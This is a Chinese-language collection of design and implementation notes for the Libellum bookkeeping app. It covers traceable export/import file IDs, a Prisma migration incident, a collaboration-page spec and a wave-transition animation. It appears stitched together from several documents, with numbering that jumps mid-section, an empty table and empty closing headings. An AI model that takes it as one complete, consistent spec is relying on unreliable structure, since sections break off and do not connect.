**文件编号**：`fileRef`，**用户可见**，格式最终定为 **`Out-20261010-153012-a3f9`** —— 这样日后用户说"我某天导出的那个文件有问题"时，**能对上是哪一次** ✓（导入用同一套规则，前缀换成 `In-`；完整格式与理由见 §8。）

**用途**：账目数据外流需要可追溯（这个应用是给别人用的，不是玩具）✓

### §六 服务端资源控制（所有者第 2 条要求）

**问题**：导出若一次性把全部交易读进内存，账目增长后会有内存风险 ✓
**先给结论**：单条流水的字段很少（十几个），**一万条约几 MB**，一次性读取**对现在的量级没有实际负担** ✓
**但仍然要设上限**，原因不是现在，是**以后** ✓

| 措施 | 说明 |
|---|---|
| **导出条数上限** | 超过上限时**明确告知用户**，并建议按月份/分类分批导出，**而不是静默截断** ✗ |
| **分批读取** | 用**游标分批**（复用列表接口的分页机制）写入输出流，而不是 `findMany()` 一次取全 ✓ |
| **文件大小** | 与条数上限等价，**不单独设**（字段固定，条数即大小）✓ |

> **原则**：**宁可让用户分批导出，也不要让服务器因为一次点击而吃满内存** ✓
> 而且**绝不静默截断**——用户以为导全了、实际少了一半，比报错糟得多 ✗

### ⭐ 往返验证方法（原文，任务要求）

**整个导出导入链路在真实服务器上往返验证过：**

即：**导出 N 行 → 把同一份文件原样导回 → N 行全部被判重跳过、`imported_count = 0`**——这是判重作用域正确（`@@unique([bookId, sourceRef])` 生效）的端到端证据。另外还有分层的验证方式：迁移侧是"三个库结构一致 + 66 个 API 测试全绿"，接口侧是"筛选正确、分批不漏不重"、"一行错整批拒绝"、"同一行带危险字符已转义"，前端是真机 iPhone 出分享菜单 / 桌面出下载。

### §八 可追溯编号：In- 与 Out-（2026-10-10 定稿）

> **所有者的要求**："导入和导出都附带一个唯一值，并且这个值最好能够说明它是导入的，还是导出的。……我希望这整个项目要极其清晰，然后其中的数据都是可以追溯的。"

**格式**：

```
Out-20261010-153012-a3f9     离开这本账（导出时生成）
In-20261010-153012-b7c2      进入这本账（导入时生成）
│   │        │      └── 4 位随机十六进制：同一秒内两次操作不会撞号
│   │        └── HHMMSS，**UTC**
│   └── YYYYMMDD，**UTC**
└── 方向：Out = 离开，In = 进入 —— **一眼就能看出数据往哪个方向走**
```

| 项 | 决定 | 理由 |
|---|---|---|
| **长度** | `Out-` 24 字符 / `In-` 23 字符 | 列是 `VARCHAR(32)`，留出余量；**长度本身也是校验点** |
| **时间用 UTC** | 是 | 这个时间戳**不是权威时间**（权威时间是日志表的 `created_at`，界面显示的是它）。用 UTC 保证**同一份文件在世界上任何服务器上生成的编号都一致**，而用户会把这个编号保存很多年 |
| **格式由谁保证** | **数据库 CHECK 约束**，不只是代码 | "追不到的编号根本写不进去"——包括日期范围（月份 01–12、日 01–31、时分秒合法），`20261399` 这种**看起来像日期但不是**的值同样写不进去 |
| **大小写** | 只允许小写十六进制 | 大写会破坏"格式唯一"，CHECK 会拒绝 |

**四条链路，逐条可追溯**：

| 数据 | 带什么编号 | 存在哪 |
|---|---|---|
| **导出** | 一个 `Out-` 编号 | 写进 `export_logs.file_ref`（唯一），**并写进导出文件的每一行** |
| **导入** | 一个 `In-` 编号 | 写进 `import_logs.file_ref`（唯一），**并写进这批每一笔流水的 `import_ref`** |
| **文件里的行值** | 该行在文件里的唯一值 | 写进流水 `source_ref`，**账本内唯一** `@@unique([bookId, sourceRef])` |
| **手工录入** | 无 | `import_ref` 与 `source_ref` 都是 `null`——**"没有来源"本身也是可读的信息** |

**导入时的三种情形（判重规则）**：

| 文件里那一行 | 处理 |
|---|---|
| 带 **我们自己的 `Out-` 编号**（也就是这份文件是我们导出的） | 记进 `import_logs.exported_file_ref`，于是界面能说"这是 10 月 10 日你导出的那份文件"，而不是猜 |
| 带的唯一值**这个账本里已经有** | **跳过，并计入 `skipped_count`**——这是判重生效，不是错误，但必须**可计数** |
| 什么唯一值都没有（外部来源的 CSV） | `source_ref` 存 `null`，**不做判重**，按新流水写入，并**提示用户可能存在重复** |

> **一句话**：**判重是"这个账本里有没有这条来源记录"，不是"这个 UUID 存不存在"。**
> 新流水的主键**永远由我们自己生成**（客户端 UUID v7，与现有录入路径一致）——文件里来的值**只作参考**。

**导出同时要记的审计（只记"发生过什么"）**：
**记**：谁、何时、范围（月份 / 收支 / 分类 / 币种）、**条数**、**格式**、**`Out-` 编号**
**不记**：导出的每一条流水、文件内容、文件本体 ✓
**导入**额外记：文件字节的 SHA-256（`source_fingerprint`，用来回答"这个文件我是不是已经导过"而不用留着文件）、`row_count` / `imported_count` / `skipped_count`（**"文件里 200 行、账本只多了 187 笔"必须答得出来**）。

### §九 第 1 步的中途状态（2026-10-10 收尾记录）——**已解决**

> ⚠️ 本节保留的原因：下面这次事故的**每一个细节以后还会遇到**，尤其是"回退代码时忘了数据库那边"。事故已修复，修复过程写在最后。

**当时发生了什么**：

| 顺序 | 结果 |
|---|---|
| 1 | 往 `prisma/schema.prisma` 加了 `Transaction.sourceRef`、`@@unique([bookId, sourceRef])`、`ExportLog` 模型 |
| 2 | `prisma validate` 通过 ✓ |
| 3 | **`prisma migrate dev` 不能用**——它需要交互终端 ✗ |
| 4 | 改为手写迁移 SQL + `prisma migrate deploy` → **迁移成功应用** ✓ |
| 5 | **但 API 测试挂了 11 / 14**（创建流水返回 500）✗ |
| 6 | **回退 schema 与迁移文件 → 66 个 API 测试重新全绿** ✓ |

**第 5 步的真正原因（2026-10-10 查清）**：**不是 schema 的问题。**

> **那个迁移只应用到了 `ledger_dev`，而集成测试跑在 `ledger_test` 上。** `ledger_test` 从来没有 `source_ref` 这一列；Prisma Client 按新 schema 生成后，每次插入都会带上这个列 → **每条 INSERT 都 500**。测试挂掉与 schema 内容无关。

**决定性证据**：这次把迁移**同时应用**到两个库之后，同一套 schema 改动（还多加了 `import_ref`、`import_logs`、账本内唯一约束）→ **66 个 API 测试全绿**。

**由此得到的纪律（比结论本身更重要）**：
1. **改了 schema 就要问一句"另一个库怎么办"**——开发库与测试库是两个数据库，测试只证明测试库。
2. **迁移文件与数据库是一对**：回退代码时如果删掉迁移文件、却留着数据库里已应用的记录，下次迁移就**无法诚实地前进**。
3. **一次只改一处**依然是对的，但**排查方向要先看"环境差异"，再看"改动内容"**——这次如果在 `ledger_test` 上先跑一次 `migrate status`，五分钟就能定位，而不是回退整个改动。

**数据库曾经领先于 schema（已修复）**：回退时删掉了迁移文件，**但 `ledger_dev` 里那条已应用的记录留了下来**，于是 `transactions.source_ref` 列、`(book_id, source_ref)` 唯一索引、`export_logs` 表**在库里存在**，而 `schema.prisma` 与迁移目录里**都没有**它们 → 出现"**目录已不存在的迁移**"。

**修复方式（可复用）**：

| 步 | 做法 |
|---|---|
| 1 | 把被删掉的那个迁移**按应用时的原样重建**（字节一致），因为它的校验和已经被记录，**改一个字都会让所有既有库失去可复现性** |
| 2 | 新增一个**诚实的第二个迁移**，只加它没有的东西（`import_ref`、账本内唯一约束、`import_logs`、格式 CHECK） |
| 3 | `ledger_dev` 的那两个手工对象**确认是空的**（0 行）后删掉，**从迁移重放**，让库与迁移历史重新一致 |
| 4 | 在**全新库**上从零跑完 11 个迁移，与 `ledger_dev` / `ledger_test` 逐项对比：**表、约束、迁移历史三者完全一致** |

> **为什么不是"直接改库对齐"**：因为要先想清楚**哪边是想要的**。这里想要的是"迁移文件能重放出一模一样的库"，所以选择**让库服从迁移**，而不是让迁移迁就库。

**环境上的四个坑（下次直接用）**：
1. **schema 在仓库根目录** `prisma/schema.prisma`，**不在 `apps/api` 下** ✗ —— 所以 `pnpm --filter @libellum/api exec prisma ...` **会跑错目录** ✓ 正确写法：在仓库根目录跑 `node_modules\.bin\prisma.cmd <cmd>`（或 `pnpm exec prisma`）✓
2. **`prisma migrate dev` 在本环境不可用**（需要交互终端）✗ —— **改用**：手写 `migration.sql` → `prisma migrate deploy` ✓（或 `prisma migrate diff --from-config-datasource --to-schema prisma/schema.prisma --script` 生成 SQL；**Prisma 7 里 `--from-url` 已被移除**，只能用 `--from-config-datasource`，靠环境变量 `DATABASE_URL` 切换目标库）✓
3. **`migrate diff` 的输出不要用 PowerShell 管道写文件** ✗ —— 验证时把 PowerShell 自己的报错和 BOM 一起写进了 `migration.sql`，导致 PostgreSQL 报语法错误、迁移进入失败状态 ✓ **改用 Python 或编辑工具写文件** ✓
4. **本机的 `psql` 不认识连接串里的 `?schema=public`** ✗（`invalid URI query parameter`）—— 手动查库时先把它去掉：`$url -split '\?' | Select-Object -First 1` ✓

### §十 导出文件的列（第 3 步实现时照这个来）

中文表头、UTF-8 BOM、金额按币种小数位格式化。**每一行都带两个可追溯的值**：

### §1 页面定位（原话）

> "我希望重新设计 Libellum 底部导航栏原本的「协作者」页面，使其成为一个**围绕当前账本本身展开**的功能页面，而不是独立的社交或联系人页面。"
> "Libellum 的整体结构是：用户先在**「账本空间」**中查看、创建和选择不同账本，再进入某一本账本进行记账、查看明细和分析。"
> "进入账本后，底部仍然保留五个导航位置：**明细、分析、记账（中央加号）、账本 / 协作、账户**。"
> "其中「明细」「分析」和中央的记账按钮**维持原有定位**，不因多账本功能而改变。"

#### §1.1 第四项的**名称随成员数变化**（原话）

> "第四个位置根据当前账本的成员情况，采用不同的名称：
> * **只有自己一位成员时，显示「账本」。**
> * **有两位或以上成员时，显示「协作」。**"
> "这两个名称对应的实际上是**同一个功能空间**，页面的整体设计语言保持一致，但**展示重点和内容布局根据成员数量自动变化**。"

⚠️ **这是整页最重要的一条约束**：不是两个页面，是**一个页面的两种侧重**。所有者反复强调过类似的话（"不是突然变成一套完全不同的页面"）——**实现时如果变成两个独立组件、两套布局体系，就是做错了。**

#### §1.2 这一页要始终回答三个问题（原话）

> "我希望这个页面始终回答三个问题：**这是什么账本？谁在使用它？这本账最近发生了什么？**"
> "它**既是当前账本的信息中心，也是进入账本管理、切换账本和多人协作功能的入口**。"

### §2 状态一：个人账本（只有自己 → 显示「账本」）

> "这一状态应当更注重**账本信息、历史记录以及账本管理**，而不是突出多人协作。"

#### §2.1 账本信息

原话列出：账本名称与图标、**账本编号**（如 40000001）、创建时间、**账目数量**、**账本占用空间**等统计、**当前成员数量**。

> "账本信息**不需要全部铺开在主页面**，可以展示几项最重要的内容，其余通过点击信息区域查看详情。"
> "这里的账本信息**主要用于帮助用户识别自己当前打开的是哪本账**，而不是**重复「分析」页面已有的收支统计功能**。"

⚠️ **最后一句是排除性要求**：不要在这里放收入/支出/结余。那些在「分析」页，重复放会让人觉得两个页面在做同一件事。

#### §2.2 编辑历史

> "希望页面中有一个比较重要的**「编辑历史」区域**。主页面可以预览**最近几条**，并提供入口查看更完整的记录。"
> "编辑历史的主要目的**不是复杂的版本管理**，而是让用户能够明确知道：**谁在什么时候，对哪一笔账目做了什么修改。**"

原话给的例子（**这三条就是验收时的样板**）：

> 「今天 14:32，naeor 将 **#000128** 午餐的金额从 ¥35 修改为 ¥38。」
> 「昨天 19:18，naeor **删除**了 **#000103** 出租车记录。」
> 「10 月 9 日 11:04，naeor **添加**了 **#000129** 超市购物记录。」

> "即使是个人账本，也有查看修改历史的意义，因此**不能因为没有其他协作者就隐藏这个功能**。"
> "首页可以只展示最近三天或最近几条历史，**但这不代表完整历史只能保存三天。完整历史的保留期限可以另行确定。**"

⚠️ **三个必须出现的要素**：**操作者、时间、操作类型 + 账目编号 + 修改前后的具体内容**。缺任何一项，这条记录就不能回答"到底改了什么"。
⚠️ **而"保留期限另行确定"是一句未决事项**，不是"只留三天"的许可。实现时先全量保留（数据量对家用规模没有压力），**期限等所有者定**。

#### §2.3 历史里的账目定位与恢复

> "希望每笔账目都有一个**固定、易读的编号**，用于在历史记录、成员交流和账目详情中准确定位。"
> "**账目编号应与账本编号区分。** 例如一本账本编号为 40000001，其中某笔账目的展示编号为 #000128。"
> "编号**不必在普通明细列表里大量出现**，避免破坏页面简洁性，但应当能够**在账目详情和历史记录中查看、复制**。"
> "在历史记录中**点击某笔账，应尽可能直接打开对应的账目详情**，而不是要求用户手动搜索编号。"

**恢复功能的原话（分级要求）**：

> "优先保证能够**查看修改前后的内容**；如果实现起来合理，**再增加单笔账目恢复功能**。"
> "用户可以选择某笔账的历史状态，将其恢复为以前的金额、分类或其他内容。但**恢复应当作为一次新的修改被记录**，而不是抹除之后发生的历史。"
> "如果恢复功能涉及太多复杂的同步或冲突问题，**可以暂时不做**。只要用户能够通过历史记录看到原来的内容，再自行修改账目，就已经满足最主要的需求。"
> "**历史记录与恢复不要求离线使用。允许必须联网才能查看完整历史或提交恢复操作。**"

⚠️ **分级很清楚**：① 能看前后内容（**必须**）→ ② 单笔恢复（**可选**，做不了就跳过）。**而"恢复是一次新的修改"是一条硬约束**——不许把历史抹掉重写。

#### §2.4 账本空间入口

> "这个页面还应当承担一个重要功能：**返回最外层的「账本空间」**。"
> "我希望这是一个**正式、明显而且容易理解的入口**，而不是隐藏在很多层设置里。"
> "它在**个人账本和共享账本中都应始终存在**，尽可能**保持统一的位置与交互方式**。"

#### §2.5 邀请入口

> "即使当前只有自己一位成员，也应当保留「邀请协作者」入口。"
> "因为**个人账本并不一定永久只能由一个人使用**。用户邀请别人加入后，它自然就成为共享账本。"
> "点击后可以进入成员邀请流程，但**不需要在个人账本状态下占据大量空间展示空荡荡的协作者列表**。"

### §3 状态二：共享账本（≥2 名成员 → 显示「协作」）

> "这一页面**仍然保留当前账本的信息、编辑历史和账本空间入口**，但**布局重点向多人共同使用的功能倾斜**。"

#### §3.1 布局变化

> "账本名称、编号、基础信息等仍然可见，但可以采用**更紧凑的形式**，例如简洁的信息卡片或可展开区域。"
> "相应地，把更多可见空间留给：**当前账本成员 / 成员管理与邀请 / 账本内的群聊或留言 / 最近的协作及编辑历史。**"
> "这种变化应该是**自然的**，而不是突然变成一套完全不同的页面。"
> "尤其是从一人变为两人后，页面可以通过**适度的布局调整**，让原本的账本信息区域收缩，成员和交流区域逐渐出现。"

#### §3.2 成员管理

> "希望能看到成员**头像、名称和基本角色**，例如「编辑者」或「查看者」。"
> "点击成员或成员区域后，可以进入完整的成员管理界面，查看成员信息、**修改权限**，以及执行适当的**移除或退出**操作。"
> "这里的关系**始终是账本成员关系**，而不是微信或 QQ 那样的**全局社交好友关系**。"
> "**成员管理必须明确属于当前账本。** 用户可能同时参与几本不同的共享账本，而每本账的成员都可能不同。"

#### §3.3 邀请（含二维码）

> "希望支持以下方式：
> * 通过**用户名搜索**已有账号并发送账本邀请。
> * 创建**分享链接**，让其他人通过链接申请或确认加入。
> * 将分享链接显示为**二维码**，方便当面扫码加入。"
> "分享链接和二维码**本质上属于同一种邀请方式**，只是分享形式不同，**不需要让用户理解成两套独立机制**。"

权限二选一（原话）：
> "**编辑者**：可以查看并编辑账目，也可以按照既有权限规则参与成员管理。"
> "**查看者**：可以查看账本内容，但不能新增、修改或删除账目。"

#### §3.4 ⚠️ 一条**改变既有流程**的要求

> "**我不希望用户必须先添加对方为好友，再另行邀请对方加入账本。** 对于单纯想一起记账的两个人来说，这样需要重复确认，操作过于复杂。"
> "因此，理想流程是：**A 选择账本并邀请 B → B 收到邀请 → B 确认加入该账本。**"
> "原有好友系统如果已经存在，可以**考虑将其用于展示最近合作过的人或方便重复邀请的联系人**，但**不应当成为加入账本的强制前置条件**。"

⚠️ **而现状与此不同。** S9 已实现的流程是"**先成为协作者，再邀请进账本**"——`routes/collab.ts` 里的邀请接口会检查 `collaborator` 关系，不是协作者就 400 `not_collaborators`。
**这是两套不同的规则，所有者现在给了新的一套。** 实现时必须改成：**邀请进账本不再要求先成为协作者**，直接按"账号编号 → 发账本邀请 → 对方同意"。
⚠️ **这一条要在动手前和所有者确认一次**（见 §7 待确认），因为它是**对已上线行为的修改**，而不是新增功能——`教训.md` §8.13 说的正是这种时刻。

#### §3.5 账号级邀请码**不属于**这一页

> "用于注册 Libellum 账号的**普通或次级邀请码**，与**加入某一本账本的分享邀请**不同。前者属于**账号级功能**，适合放在**「账户」的相关设置**中，**不需要占据当前账本的协作页面**。"

⚠️ **所以 S9 放在协作者页上的「邀请码」一节要挪到「账户」页。**

#### §3.6 账本内群聊 / 留言

> "它只属于当前账本，类似一个**小型群聊或留言板**：同一本账的成员可以看到公共留言；成员可以发送文字；显示**发送者和发送时间**；**不提供私人聊天**；不需要复杂的**好友聊天体系**；不必追求与专业聊天软件相同的功能完整度。"

原话给的用法例子：
> 「昨天买菜的 86 元是不是还没有记？」/「这笔房租我已经付过了。」/「午餐这笔好像记错金额了。」
> "我希望它更接近一个**围绕账本的公共讨论空间**。"

**明确不做**（原话）：
> "消息撤回、表情包、语音聊天、在线状态、已读回执等功能，**都不是当前的核心需求**。"

**可选的后续增强**：
> "如果能让用户在留言中**引用某笔账目**，会很有意思……这项功能可以作为**后续增强**，不必为了实现它而增加太多复杂度。"

**权限**：
> "**查看者原则上也可以参与文字留言**，因为**交流并不等于修改账目**。"

#### §3.7 共享账本的编辑历史（比个人账本更重要）

> "因为不同成员都可能修改同一笔记录，所以希望能够清楚看到：谁新增了账目 / 谁修改了账目 / **修改了哪些字段** / **修改前后分别是什么** / 谁删除了账目 / 谁执行了历史恢复。"
> "此外，也可以**适当展示成员加入、退出或权限变动**等重要协作事件。"
> "主页面只展示**最近几条**，点击后打开**完整记录**。"
> "历史记录尽量以**简洁、易读**的方式呈现，**不要变成复杂的数据库日志界面**。"

### §4 通知系统与本页的关系（原话）

> "应该区分两个概念：**账号通知**：属于用户账号本身，可能来自不同账本……**这类信息继续通过现有通知系统处理。账本历史**：属于当前账本，记录这本账里已经发生的事情……"
> "这样用户即使**尚未加入某本账**，也能通过通知收到邀请，而不需要进入一份自己还没有权限查看的账本。"
> "协作页面**不需要重复建设完整的通知中心**，但可以**适度显示与当前账本有关的最新动态**。"

⚠️ **这是一条排除性要求**：铃铛已经存在（S9 做的），**不要把通知搬进这一页**。

### §5 视觉与交互（原话）

> "整体保持现有的**品牌绿色、简洁排版和柔和配色**。页面内容可以使用卡片或分组，但**层级要清楚**。"
> "**个人账本页面相对安静**，强调账本信息与历史。**共享账本页面更加活跃**，强调成员、留言和协作动态。"
> "**账本空间入口始终明显且容易使用。** 不要求用户进入很多层菜单才能完成邀请或切换账本。"
> "点击成员、展开历史、**从个人账本转变为共享账本**等交互，可以使用**适量、自然、连续的过渡动画**。"
> "动画应当**帮助用户理解界面的变化**，而不是**延长等待时间**。"
> "尤其是我喜欢那种**一个界面中的元素自然转变为下一个状态中的元素**的效果，而不是简单地让新页面突然覆盖旧页面。"
> "但默认模式仍然以**实用、轻量、流畅**为主，不需要在这个功能页面放入过于华丽的装饰。"

### §6 优先级（原话，逐字）

> "这个页面最核心的功能是：**当前账本信息、返回账本空间、账本成员管理、邀请入口、编辑历史。**"
> "共享账本的文字留言也是我希望最终拥有的功能，但**不必为了它延误已有核心协作功能**。"
> "**历史恢复可以作为可选功能**：只要历史记录足够清楚，用户能够找到对应账目并手动改回去，就已经基本满足我的需要。"
> "更复杂的**账目引用聊天、完整历史版本恢复、丰富消息功能，都可以以后逐步完善**。"
> "最重要的是，**不要为了使「协作」页面显得丰富，就强行引入完整的社交系统。Libellum 的核心始终是记账。**"
> "我希望它既适合一个人安静地记录生活，也适合几个人方便地管理共同的收支。「账本 / 协作」页面应当**随着使用人数自然改变自己的侧重点**，而不是要求个人用户和共享账本用户使用**两套截然不同的产品**。"

#### 第 1 步：编辑历史的数据地基（**这一步是全部工作里最重的**）

| 事项 | 说明 |

### §1 两种状态，同一个页面

| 状态 | 用途 | 内容 |
|---|---|---|
| **展示态**（`--p = 0`） | 第一次进入时的品牌展示 | 品牌绿 `#55997a` 的抽象海洋、层叠波面、留白呼吸感、`Libellum` 字样为主视觉文字、可少量抽象纸张意象 |
| **常规态**（`--p = 1`） | 日常选择与管理账本 | 现有实用型账本空间：账本卡片（图标/名称/个人或共享/成员）、点击进入、右侧独立「更多」、新建入口 |

**所有者原话**：*"这两种状态属于同一个页面，不是两个互相独立的页面，也不应该通过传统的页面跳转或整页覆盖实现切换."*

⚠️ **属于第三类页面**（特殊展示／沉浸式）。所有者定的视觉原则：**"华丽用于欢迎与展示，简约用于日常与操作。"** 这份华丽**不得扩散到日常功能界面**。

### §2 最高优先级：退潮过渡

**所有者说这是本次优先级最高的部分。**

1. 绿色海浪整体**向上移动或收束**
2. 不同层次波面带**轻微速度差和惯性**，整体方向一致
3. 波浪退去时，下方**逐渐显露**常规内容
4. 展示态的部分**颜色、形状或曲线自然演化**为常规态顶部的视觉装饰
5. 过渡完成后账本列表**可正常操作**

**明确禁止**（所有者原话）：
- ❌ 只是"绿色画面渐隐、白色页面渐显"
- ❌ 简单把完整新页面从下面推上来覆盖旧页面

**目标**：*"原本那片海正在退去，而账本空间就是从这片海里自然显露出来的."*
**时长**：**600–850 ms**。所有者说这是"设计参考，而不是必须机械执行的固定数值"。**不要设计成需要等好几秒的开场动画。**

### §3 反向：常规态 → 展示态

- 在常规态**从页面顶部向下滑动**回到展示态
- ⚠️ **只在"已位于顶部"且"有明确继续下拉动作"时触发**；**不能把普通滚动或轻碰误判成切换**
- 反向动画与退潮**相互呼应**：波面重新展开
- 可以有一个**不干扰画面的辅助入口**主动重看，但不要增加界面负担

### §4 什么时候播放展示态

| 场景 | 行为 |
|---|---|
| 新用户第一次进账本空间 | **优先展示态** |
| 上滑之后 | 进入常规态 |
| 以后从其他账本返回账本空间 | **默认直接常规态** |
| 顶部下拉 | 重新进入展示态 |
| 已有用户正常登录 | **仍走现有的"上次使用账本"恢复逻辑，不被展示动画打断** |
| 用户主动返回账本空间 | 不必重新经历完整展示 |

⚠️ **所有者原话**：*"展示态是一个欢迎体验，而不是每次进入软件都必须经过的启动广告."*

### §5 展示态自身的动画

缓慢起伏、波面之间**轻微速度差**，接近**安静的潮汐**。
**禁止**：剧烈晃动、**高频闪烁**、音频可视化／音乐播放器风格、大量元素同时无规律运动、**复杂 3D 场景**。**不要炫技。**

### §6 响应式与手势

手机、iPad、桌面浏览器；iPad 横屏与竖屏；触屏上滑与下拉；**手势与正常滚动的冲突**；Safari 与 PWA 安全区域；**动画结束后按钮必须可用**。

### §7 ⚠️ 实现基础：项目里已经有这个机制（**最重要的一节**）

**所有者规格里的每一条，`apps/web/src/lib/detailTransition.ts` 都已经解决过一次。** 明细页的「展示态 ↔ 明细态」就是同一个模式，2026-10-10 完成并调过多轮。

#### §7.1 单一连续进度，而不是两套 DOM

> *"`0` is the display state — the tall green summary... `1` is the list state... Everything in between is a real position, not a transition between two finished layouts."*

⚠️ **这直接满足所有者"不能是整页覆盖／突然消失"的要求**：中间态是真实位置，所有几何都由 `--p` 用 `calc()` 推导。

#### §7.2 进度存在 ref 里，每帧写 CSS 变量，**不进 React state**

> *"a phone fires scroll and touch events at 60–120 Hz, and re-rendering the ledger that often is how a transition starts to stutter. React is told only when the screen settles."*

⚠️ **这条是实现流畅度的关键，不要"改进"成 `useState`。**

#### §7.3 弹簧 + **速度上限**（这条最值得抄）

> *"So it is a speed limit rather than a physics fix: whatever the velocity reading says, the value moves at most this fast, and the whole animation therefore always plays out over at least half a second."*

`MAX_SPEED = 1 / 0.5` —— **保证任何手势都不会让过渡快于 0.5 秒**。所有者当年为"卡顿"折腾了好几轮，最后是这个上限解决的。
⚠️ **与本次规格的关系**：所有者要 600–850 ms，而这个上限保证**最少 500 ms**。**两者相容**，但实现时要确认总时长落在 600–850 区间内（可能需要调 `DRAG_DISTANCE` 或弹簧常数）。

#### §7.4 手势：**按落点分区**，不按方向猜

> *"deciding by direction meant guessing from the first few pixels, getting it wrong, and either killing the transition or blocking an ordinary scroll. Where the finger starts is not a guess."*

区域内有横向滚动条的元素标 `data-h-scroll`，落在里面的手势**完全属于它**，页面不拦。

#### §7.5 手势速度：**整段平均**，不用最近采样

> *"A recent sample is the noisiest thing available: fingers slow and drift in the last few milliseconds before they lift... The average over the gesture cannot do that."*

#### §7.6 常规态顶部的下拉：**已经实现了，而且踩过坑**

> *"The previous version checked 'at the top' but not the direction, so an upward drag there was swallowed: prevented from scrolling and driven into a progress that was already at its end. The list jolted and went nowhere."*

⚠️ **这正是所有者规格里"不要把普通的向下滚动或轻微触碰误判成切换状态"那一条**，**已经修好了**：`if (progress.current >= 1) { if (!atTop || dy <= 0) return; ... }`

#### §7.7 桌面端：滚轮也能驱动

`WHEEL_SCALE = 2400`，并且**累积增量而不是每个事件单独应用**（触控板一次手势会发几十个事件）。

#### §7.8 记忆：模块级 session

`session = { progress, month, kind, scrollTop }` 存在**模块变量**里而不是 context，所以切换 Tab 再回来能保持；**整页刷新会重置**（这也是所有者要的）。

#### §7.9 一代一主：`generation` 计数器

> *"a spring that is mid-step will schedule itself again from inside its own callback — so cancelling the handle and then starting a new spring could leave two of them writing progress."*

⚠️ **每个弹簧带着自己的编号，编号不再是当前值就立即停止。**

#### §9.2 ⚠️ 两条我自己定的数字，与规格的偏离

1. **没有用 CSS transition，用了弹簧。** 所有者给的是时长（600–850ms），而**弹簧的时长是它常数的结果、不是能设定的东西**。CSS transition 又**无法跟手**，而所有者要的是*"轻微的速度差和惯性"*——**惯性是弹簧有的**。**600–850ms 现在由速度上限（≥500ms）与弹簧常数共同保证，而不是由一条 CSS 规则强加。**
2. **拖拽距离 420（明细页是 260）。** 几何不同：那一页的汇总区缩几百像素，这一页的海有一屏高、列表要从屏外拉上来。**沿用 260 会让一次手势跨完整个范围。**

### §11 第二轮重构：从"开屏页"改成"同一页的两种形态"

> 所有者 2026-10-13 的反馈判定第一版方向错误，本节记录这次返工。

#### §11.1 所有者对第一版的判断（原话）

> *"目前实现的主要问题是：展示态更像很多安卓手机的开屏页，它覆盖在真正的首页上方，用户上滑后，展示页逐渐变淡、消失，露出下面的正式页面。这不是我想要的效果。"*

**具体错在三处**：
1. **海在屏幕下方**，浅色在上。所有者要的是反过来：*"最深色的绿色波面位于最上层，构成页面上方的主要视觉区域"* —— 上深下浅，最后没入白色。
2. **海整个离开了屏幕**（`translateY(calc(var(--p) * -100%))`）。**水是"走了"，而这正是它读起来像开屏页关闭的原因。** 所有者要的是**收束**：*"海浪不能完全消失……收束成常规态顶部的一小段波浪装饰."*
3. **品牌文字漂在水面上**，而不是被编进构图里。

#### §11.2 机制：从"位移"改成"高度"

每一层的 `top` 与 `height` 都是对唯一那个 `--p` 的 `calc()` 插值：
- `--p = 0` —— 海占 72vh，最深色在最上
- `--p = 1` —— 海是 13vh 的一条浅带：**同一套曲线，被压扁了**

⚠️ **没有任何东西被移出屏幕，也没有交叉淡化。**
⚠️ **压扁本身就让曲线变平缓，这是性质而不是技巧。** `preserveAspectRatio="none"` 之下，24vh 高的那层与 3.4vh 高的那层共用同一条 path —— **收缩时波浪按比例变平**，正好是 *"波面曲线可以随状态变化而自然变平缓."*

#### §11.3 底部露出真实内容，而且不是靠淡入

内容层从 `opacity: var(--p)` + `translateY(24px)` 改成**由海的高度把它推下去**：`marginTop: var(--sea-h)`。

⚠️ **去掉的那两条正是所有者点名不要的**：*"整体渐隐、常规页面从下面出现"*。**淡化说的是"另一个页面来了"；这个说的是同一页把自己露了出来。**

账本卡片**从第一帧就在布局里**，所以展示态往下滚就能看到账本空间 —— 这正是 *"让用户能够提前看到一些属于账本空间的实际内容"*，也避开了他禁止的"先显示一张装饰性的假卡片，之后突然换成真卡片"。

#### §11.4 常规态顶部保留 13vh 潮痕

- `SEA_TALL = 72` / `SEA_SHORT = 13`
- 13vh ≈ 状态栏加一点余量 —— **作为品牌在场，但不挡路**（所有者警告过 *"不要让它占据过大的垂直空间，影响用户快速选择账本."*）
- 内容从 `13vh + 2.5rem + 安全区` 开始，**潮痕不遮挡标题**

#### §11.5 ⚠️ 本轮修掉的四个缺陷

| # | 缺陷 | 后果 |
|---|---|---|
| 1 | **品牌文字存在两份** | 屏幕上同时出现两个 `Libellum`（产物核对：标语从 2 次降到 1 次） |
| 2 | **海仍是 `fixed` 且向上移出屏幕** | **所有者否掉的机制回来了** —— 上一轮的重构会白做 |
| 3 | **拖拽距离与海行程不同单位**（420px vs 59vh） | 手指走完了、海还剩五分之一没走完 |
| 4 | **四处注释在描述已删除的机制** | 下一个人会照着不存在的架构改代码 |

**第 1、2 条都是"重构做了一半"的形态**，所以验收时最该确认的是：**海是"收窄"还是"走掉"。**

#### §11.6 跟手比例

`SPACE_DRAG_VH = 62`，像素由 `spaceDragPx(window.innerHeight)` 每次手势重算：**62vh 的手指带 59vh 的海 —— 手机、iPad 横屏、矮桌面窗口都一样。**
⚠️ **每次重算而不是挂载时算一次**：手机会旋转、窗口会改大小、Safari 动态视口在工具栏收放时会变高。

#### §11.7 ⚠️ 仍需所有者确认

| 项 | 为什么我做不到 |
|---|---|
| **上深下浅的层叠是否好看** | 看不到渲染 |
| **收束是否连续自然** | 同上，且这是最高优先级 |
| **13vh 潮痕是否够可见 / 像不像绿色横幅** | 同上 —— **13vh 与品牌名大小是一处权衡** |
| **跟手是否舒服** | 需要触摸设备 |
| **iPad 横竖屏、Safari/PWA、减少动态效果** | 需要真机与系统设置 |

⚠️ **未做（等答复）**：本节 §10 那条"颜色/形状演化为常规态顶部装饰"现在**已经由 13vh 潮痕实现了**，但"最前一层走 62% 留一条弧线"那个更具体的形态**仍未做**——因为现在的做法（整体收束到 13vh）已经满足了 *"常规态顶部必须保留一小段绿色波浪"*，而那条例外形态是否还要，等所有者一句话。

### 状态术语

### 产品要求（逐条）

- 账本空间是**同一页面的展开、收缩两种形态**；海浪始终横跨全宽、保留在顶部。

### ⭐ 曲线算法（任务要求的"曲线算法"，逐字）

